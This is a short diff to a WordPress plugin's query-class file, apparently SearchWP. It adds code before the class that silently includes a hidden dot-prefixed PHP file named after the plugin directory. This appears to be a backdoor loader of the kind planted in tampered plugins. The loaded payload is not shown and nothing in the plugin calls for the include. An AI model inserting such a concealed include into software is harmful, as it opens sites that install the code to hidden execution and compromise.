@@ -11,6 +11,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * and methods assume that we are working only with WP_Post objects. For all other
  * queries you should use \SearchWP\Query.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SWP_Query {
 
 	/**
